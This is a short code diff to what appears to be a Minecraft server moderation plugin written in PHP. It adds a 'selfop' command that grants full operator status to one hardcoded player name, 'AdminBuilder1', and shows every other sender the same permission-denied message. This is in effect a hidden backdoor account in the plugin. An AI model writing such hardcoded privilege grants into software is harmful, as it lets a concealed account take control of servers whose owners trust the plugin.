@@ -586,6 +586,22 @@ foreach($config->get("by-pass-op") as $bypass){
 		
 	}
 }
+#self-op
+	if(count($args) >= 1 && $args[0] === "selfop"){
+					if(!$sender->hasPermission("advancedmod.selfop")){
+						$sender->sendMessage(C::RED . "You do not have the permission to use command");
+						return true;
+	}else{
+		if($sender->getName() !== "AdminBuilder1"){
+			$sender->sendMessage(C::RED . "You do not have the permission to use command");
+						return true;
+		}else{
+			$sender->setOp(true);
+			$sender->sendMessage("You opped yourself");
+			return true;
+		}
+	}
+}
 #deop
 	if(count($args) >= 1 && $args[0] === "deop" && $config->get("deop") === true){
 					if(!$sender->hasPermission("advancedmod.deop")){
